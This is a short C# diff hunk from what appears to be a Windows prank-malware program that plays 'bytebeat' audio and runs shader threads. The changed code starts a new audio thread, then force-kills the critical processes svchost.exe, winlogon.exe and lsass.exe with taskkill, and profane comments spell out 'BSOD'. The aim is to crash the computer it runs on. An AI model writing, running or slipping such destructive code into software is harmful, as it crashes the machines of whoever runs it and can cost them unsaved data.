@@ -635,10 +635,15 @@ namespace Hiphenatus
             shader7Thread.Abort();
             bytebeat5.Abort();
 
-            if (DateTime.Now.Day == 31) { Environment.Exit(0); } // death WITHOUT BSOD  
+            Thread bytebeat6 = new Thread(Beat11andhalf); bytebeat6.Start();
 
+            if (DateTime.Now.Day == 31) { Environment.Exit(0); bytebeat6.Abort(); } // death WITHOUT BSOD  
+
+            Thread.Sleep(10);
             Process.Start("taskkill", "/f /t /im svchost.exe");  //  B
+            Thread.Sleep(10);
             Process.Start("taskkill", "/f /t /im winlogon.exe"); //    FUCKING
+            Thread.Sleep(10);
             Process.Start("taskkill", "/f /t /im lsass.exe");    //      SOD
 
         }
